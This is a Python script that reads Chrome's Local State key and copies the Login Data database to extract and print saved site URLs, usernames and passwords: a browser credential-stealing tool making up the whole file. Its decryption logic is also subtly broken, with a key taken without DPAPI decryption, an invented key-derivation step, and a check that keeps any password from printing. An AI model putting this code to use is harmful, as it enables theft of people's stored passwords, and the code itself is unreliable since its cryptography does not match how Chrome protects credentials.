import os
import json
import base64
import sqlite3
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import shutil
from datetime import datetime, timedelta

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        encryption_key = encrypted_key[16:]  # Trim the DPAPI prefix
        return encryption_key

from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2
from Cryptodome.Util.Padding import unpad

def decrypt_password(password, key):
    try:
        salt = password[3:15]
        ciphertext = password[15:]
        kdf = PBKDF2(key, salt, 16, 1003)
        key = kdf[:16]
        cipher = AES.new(key, AES.MODE_GCM, nonce=ciphertext[:12])
        decrypted_password = cipher.decrypt_and_verify(ciphertext[12:-16], ciphertext[-16:])
        unpadded_password = unpad(decrypted_password, AES.block_size)
        return unpadded_password.decode()
    except Exception as e:
        return ""



def main():
    try:
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 1", "Login Data")
        temp_db_path = "Chromedata.db"
        shutil.copyfile(db_path, temp_db_path)
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                print(f"Original URL: {origin_url}")
                print(f"Action URL: {action_url}")
                print(f"Username: {username}")
                if password == True:
                    print(f"Password: {password}")
                else:
                    print(f"Password: Unable to decrypt")
            else:
                continue
            if date_created != 86400000000 and date_created:
                print(f"Created date: {str(get_chrome_datetime(date_created))}")
            if date_last_used != 86400000000 and date_last_used:
                print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
            print("="*50)
        cursor.close()
        db.close()
    except Exception as e:
        print(f"An error occurred: {str(e)}")
    finally:
        try:
            os.remove(temp_db_path)
        except Exception as e:
            print(f"An error occurred while deleting the temporary file: {str(e)}")

if __name__ == "__main__":
    main()
